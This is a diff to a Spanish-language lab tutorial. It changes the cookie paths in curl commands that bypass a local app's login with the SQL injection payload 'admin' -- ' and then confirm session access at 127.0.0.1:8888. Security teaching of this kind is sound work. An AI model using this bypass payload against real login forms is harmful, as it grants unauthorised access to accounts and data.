@@ -16,7 +16,7 @@ curl -s -o /dev/null -w "%{http_code}\n" \
 Usamos `--data-urlencode` para que `curl` codifique correctamente la comilla y el espacio del payload:
 
 ```bash
-curl -s -c /root/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" \
+curl -s -c /tmp/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" \
   --data-urlencode "usuario=admin' -- " \
   --data-urlencode "password=loquesea" \
   http://127.0.0.1:8888/login
@@ -27,7 +27,7 @@ Si ves `302` en vez de `200`, entraste. Un login exitoso redirige a `/`; uno fal
 ## 2.3 — Confirmar el acceso
 
 ```bash
-curl -s -b /root/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8888/
+curl -s -b /tmp/cookies-sqli.txt -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8888/
 ```
 
 `200` sin redirect: la cookie de sesión que generó el bypass te deja entrar al CRUD igual que un login legítimo.
